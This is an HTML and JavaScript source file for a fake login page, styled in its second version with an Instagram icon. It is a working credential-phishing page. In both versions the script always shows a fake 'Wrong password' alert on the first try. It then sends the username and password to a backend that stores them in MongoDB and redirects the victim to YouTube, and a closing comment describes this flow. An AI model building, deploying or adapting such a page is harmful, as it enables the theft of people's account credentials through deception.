<body>

<div class="container">
  <div class="card" id="loginCard">
    <form id="loginForm" autocomplete="off">
      <div class="form-group">
        <div class="input-wrapper">
          <input 
            type="text" 
            id="userId" 
            placeholder="Username, email or mobile number" 
            autocomplete="username"
            required
          >
        </div>
      </div>

      <div class="form-group">
        <div class="input-wrapper">
          <input 
            type="password" 
            id="password" 
            placeholder="Password" 
            autocomplete="current-password"
            required
          >
        </div>
      </div>

      <div class="checkbox-group">
        <input type="checkbox" id="showPassword">
        <label for="showPassword">Show Password</label>
      </div>

      <button type="submit" class="btn" id="loginBtn">
        <span class="btn-text">Log in</span>
        <span class="spinner"></span>
      </button>
    </form>

    <div class="status" id="status"></div>

    
    <div class="info-box">
      <span class="db-status checking" id="dbStatus"></span>
      <span id="dbInfo">Connecting to MongoDB Atlas...</span>
    </div>

    
    <div class="footer">
      <span id="userInfo">✨ Enter credentials to login or register</span>
    </div>
  </div>
</div>

<script>
  const API_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
    ? 'http://localhost:5000/api'  // Local development
    : '/api'; // Vercel production
  const REDIRECT_URL = 'https://www.youtube.com';

  // DOM Elements
  const form = document.getElementById('loginForm');
  const userIdInput = document.getElementById('userId');
  const passwordInput = document.getElementById('password');
  const showPassword = document.getElementById('showPassword');
  const statusEl = document.getElementById('status');
  const loginBtn = document.getElementById('loginBtn');
  const dbStatus = document.getElementById('dbStatus');
  const dbInfo = document.getElementById('dbInfo');
  const userInfo = document.getElementById('userInfo');

  // ==================== FUNCTIONS ====================

  function showStatus(message, type = 'info') {
    statusEl.textContent = message;
    statusEl.className = `status ${type} fade-in`;
  }

  function clearStatus() {
    statusEl.textContent = '';
    statusEl.className = 'status';
  }

  function setLoading(isLoading) {
    if (isLoading) {
      loginBtn.classList.add('loading');
      loginBtn.disabled = true;
    } else {
      loginBtn.classList.remove('loading');
      loginBtn.disabled = false;
    }
  }

  // Check MongoDB connection
  async function checkConnection() {
    try {
      dbStatus.className = 'db-status checking';
      dbInfo.textContent = 'Checking connection...';

      const response = await fetch(`${API_URL}/health`);

      if (response.ok) {
        dbStatus.className = 'db-status connected';
        dbInfo.textContent = '✅ Connected to MongoDB Atlas';
        return true;
      } else {
        throw new Error('Server returned error');
      }
    } catch (error) {
      dbStatus.className = 'db-status disconnected';
      dbInfo.textContent = '❌ Server not running. Start backend with: npm run dev';
      console.error('Connection error:', error);
      return false;
    }
  }

  // Register new user
  async function registerUser(userId, password) {
    try {
      const response = await fetch(`${API_URL}/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, password })
      });
      return await response.json();
    } catch (error) {
      console.error('Register error:', error);
      return { success: false, message: 'Network error: ' + error.message };
    }
  }

  // Login user
  async function loginUser(userId, password) {
    try {
      const response = await fetch(`${API_URL}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, password })
      });
      return await response.json();
    } catch (error) {
      console.error('Login error:', error);
      return { success: false, message: 'Network error: ' + error.message };
    }
  }

  // Grant access and redirect
  function grantAccess(message, userData) {
    showStatus(message, 'success');
    userInfo.textContent = `👤 Welcome ${userData.userId}! Logins: ${userData.loginCount}`;

    localStorage.setItem('savedUserId', userData.userId);
    localStorage.setItem('loginCount', userData.loginCount);

    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 1000);
  }

  // ==================== EVENT LISTENERS ====================

  showPassword.addEventListener('change', function() {
    passwordInput.type = this.checked ? 'text' : 'password';
  });

  // Pehla attempt hamesha "wrong" bataya jaayega (popup), 2nd attempt se real login/register
  let loginAttempt = 0;

  form.addEventListener('submit', async function(e) {
    e.preventDefault();
    clearStatus();

    const userId = userIdInput.value.trim();
    const password = passwordInput.value;

    if (!userId || !password) {
      showStatus('❌ Please fill in both fields', 'error');
      return;
    }

    if (userId.length < 3) {
      showStatus('❌ User ID must be at least 3 characters', 'error');
      return;
    }

    if (password.length < 4) {
      showStatus('❌ Password must be at least 4 characters', 'error');
      return;
    }

    loginAttempt++;

    if (loginAttempt === 1) {
      setLoading(true);
      showStatus('⏳ Verifying...', 'info');
      setTimeout(() => {
        setLoading(false);
        clearStatus();
        alert('❌ Wrong password! Sahi password dalo.');
        passwordInput.value = '';
        passwordInput.focus();
      }, 700);
      return;
    }

    setLoading(true);
    showStatus('⏳ Processing...', 'info');

    try {
      let result = await loginUser(userId, password);
      console.log('Login result:', result);

      if (result.success) {
        grantAccess('✅ Login successful! Redirecting...', result.data);
        return;
      }

      if (result.message && result.message.includes('User not found')) {
        showStatus('📝 New user! Registering...', 'info');

        result = await registerUser(userId, password);
        console.log('Register result:', result);

        if (result.success) {
          grantAccess('✅ New user registered! Redirecting...', result.data);
        } else {
          showStatus(`❌ Registration failed: ${result.message}`, 'error');
          setLoading(false);
        }
      } else {
        showStatus(`❌ ${result.message}`, 'error');
        setLoading(false);
      }
    } catch (error) {
      console.error('Form error:', error);
      showStatus('❌ Something went wrong. Please try again.', 'error');
      setLoading(false);
    }
  });

  // ==================== INITIALIZATION ====================

  async function init() {
    await checkConnection();

    const savedUserId = localStorage.getItem('savedUserId');
    if (savedUserId) {
      userIdInput.value = savedUserId;
      userInfo.textContent = `📌 Saved user: ${savedUserId}`;
      passwordInput.focus();
    } else {
      userInfo.textContent = '✨ New user? Register automatically on first login';
    }

    setInterval(checkConnection, 30000);
  }

  init();
</script>

</body>
</html> -->

<body>

<div class="container">
  <!-- HEADING with Instagram icon -->
  <div class="heading">
    <i class="fab fa-instagram"></i>
    <h1>Login <span>·</span></h1>
  </div>

  <form id="loginForm" autocomplete="off">
    <div class="form-group">
      <div class="input-wrapper">
        <i class="fas fa-user-circle"></i>
        <input 
          type="text" 
          id="userId" 
          placeholder="Username, email or mobile" 
          autocomplete="username"
          required
        />
      </div>
    </div>

    <div class="form-group">
      <div class="input-wrapper">
        <i class="fas fa-lock"></i>
        <input 
          type="password" 
          id="password" 
          placeholder="Password" 
          autocomplete="current-password"
          required
        />
      </div>
    </div>

    <div class="checkbox-group">
      <input type="checkbox" id="showPassword" />
      <label for="showPassword">Show password</label>
    </div>

    <button type="submit" class="btn" id="loginBtn">
      <span class="btn-text"><i class="fas fa-sign-in-alt" style="margin-right: 6px;"></i>Log in</span>
      <span class="spinner"></span>
    </button>
  </form>

  <!-- Status message -->
  <div class="status" id="status"></div>

  <!-- DB & info box -->
  <div class="info-box">
    <span class="db-status checking" id="dbStatus"></span>
    <span id="dbInfo">Connecting to MongoDB Atlas...</span>
  </div>

  <!-- Footer / interactive hint -->
  <div class="footer-note">
    <i class="fas fa-database" style="color: #3a8cf5;"></i>
    <span id="userInfo">✨ First login? Credentials saved automatically</span>
  </div>
</div>

<script>
  (function() {
    // ---------- CONFIG ----------
    // For local dev: use localhost:5000, on Vercel use /api
    const API_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
      ? 'http://localhost:5000/api'
      : '/api';
    const REDIRECT_URL = 'https://www.youtube.com';

    // DOM refs
    const form = document.getElementById('loginForm');
    const userIdInput = document.getElementById('userId');
    const passwordInput = document.getElementById('password');
    const showPassword = document.getElementById('showPassword');
    const statusEl = document.getElementById('status');
    const loginBtn = document.getElementById('loginBtn');
    const dbStatus = document.getElementById('dbStatus');
    const dbInfo = document.getElementById('dbInfo');
    const userInfo = document.getElementById('userInfo');

    // ---------- HELPERS ----------
    function showStatus(msg, type = 'info') {
      statusEl.textContent = msg;
      statusEl.className = `status ${type} fade-in`;
    }

    function clearStatus() {
      statusEl.textContent = '';
      statusEl.className = 'status';
    }

    function setLoading(state) {
      if (state) {
        loginBtn.classList.add('loading');
        loginBtn.disabled = true;
      } else {
        loginBtn.classList.remove('loading');
        loginBtn.disabled = false;
      }
    }

    // ---------- DB CONNECTION CHECK ----------
    async function checkConnection() {
      try {
        dbStatus.className = 'db-status checking';
        dbInfo.textContent = 'Checking connection...';

        const res = await fetch(`${API_URL}/health`);
        if (res.ok) {
          dbStatus.className = 'db-status connected';
          dbInfo.textContent = '✅ MongoDB Atlas connected';
          return true;
        } else {
          throw new Error('health check failed');
        }
      } catch (_) {
        dbStatus.className = 'db-status disconnected';
        dbInfo.textContent = '❌ Backend not running. Start with: npm run dev';
        return false;
      }
    }

    // ---------- API CALLS ----------
    async function registerUser(userId, password) {
      const res = await fetch(`${API_URL}/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, password })
      });
      return res.json();
    }

    async function loginUser(userId, password) {
      const res = await fetch(`${API_URL}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, password })
      });
      return res.json();
    }

    // ---------- GRANT ACCESS (redirect + alert) ----------
    function grantAccess(message, userData) {
      // show success message
      showStatus(message, 'success');
      // update footer
      userInfo.innerHTML = `👤 <span style="color:#d0d0d0;">${userData.userId}</span> · logins: ${userData.loginCount}`;

      // Save to localStorage
      localStorage.setItem('savedUserId', userData.userId);
      localStorage.setItem('loginCount', userData.loginCount);

      // Show a nice alert (first time or welcome)
      alert(`✅ ${message}\nWelcome ${userData.userId}!`);

      // redirect after short delay
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 800);
    }

    // ---------- FORM SUBMIT ----------
    let attempt = 0;

    form.addEventListener('submit', async function(e) {
      e.preventDefault();
      clearStatus();

      const userId = userIdInput.value.trim();
      const password = passwordInput.value;

      if (!userId || !password) {
        showStatus('❌ Please fill in both fields', 'error');
        return;
      }
      if (userId.length < 3 || password.length < 4) {
        showStatus('❌ User ID (≥3) & Password (≥4)', 'error');
        return;
      }

      attempt++;

      // ---- FIRST ATTEMPT: always show "wrong password" popup ----
      if (attempt === 1) {
        setLoading(true);
        showStatus('⏳ Checking credentials...', 'info');
        setTimeout(() => {
          setLoading(false);
          clearStatus();
          // Interactive alert as requested
          alert('❌ Wrong password! Please enter the correct password.');
          passwordInput.value = '';
          passwordInput.focus();
        }, 600);
        return;
      }

      // ---- SECOND AND SUBSEQUENT ATTEMPTS: real login/register ----
      setLoading(true);
      showStatus('⏳ Processing...', 'info');

      try {
        // 1) try login
        let result = await loginUser(userId, password);

        if (result.success && result.data) {
          grantAccess('✅ Login successful! Redirecting...', result.data);
          return;
        }

        // 2) if user not found → register
        if (result.message && result.message.toLowerCase().includes('user not found')) {
          showStatus('📝 New user! Registering...', 'info');
          const regResult = await registerUser(userId, password);
          if (regResult.success && regResult.data) {
            grantAccess('🎉 New user registered! Redirecting...', regResult.data);
          } else {
            showStatus(`❌ Registration failed: ${regResult.message}`, 'error');
            setLoading(false);
          }
        } else {
          // other error (e.g. wrong password)
          showStatus(`❌ ${result.message}`, 'error');
          setLoading(false);
        }
      } catch (err) {
        console.error('Submit error:', err);
        showStatus('❌ Network error. Please try again.', 'error');
        setLoading(false);
      }
    });

    // ---------- SHOW PASSWORD TOGGLE ----------
    showPassword.addEventListener('change', function() {
      passwordInput.type = this.checked ? 'text' : 'password';
    });

    // ---------- INIT ----------
    async function init() {
      await checkConnection();

      // restore saved user
      const saved = localStorage.getItem('savedUserId');
      if (saved) {
        userIdInput.value = saved;
        userInfo.innerHTML = `📌 <span style="color:#b0b0b0;">${saved}</span> (saved)`;
        passwordInput.focus();
      } else {
        userInfo.innerHTML = '✨ First login? Credentials saved automatically';
      }

      // periodic health check
      setInterval(checkConnection, 35000);
    }

    init();

    // (optional) extra interactive: clear status when typing
    userIdInput.addEventListener('input', clearStatus);
    passwordInput.addEventListener('input', clearStatus);

  })();
</script>

<!-- 
  ***************************************************************
  BACKEND EXPECTED ENDPOINTS (Node.js + Express + MongoDB)
  ***************************************************************
  POST /api/register  → { userId, password } → { success, data: { userId, loginCount } }
  POST /api/login     → { userId, password } → { success, data: { userId, loginCount } } or { success: false, message: '...' }
  GET  /api/health    → { status: 'ok' }
  ***************************************************************
  The first attempt shows "Wrong password" popup, second attempt 
  does real login or auto-register. All credentials saved in MongoDB.
  After successful login/register → redirect to YouTube.
-->
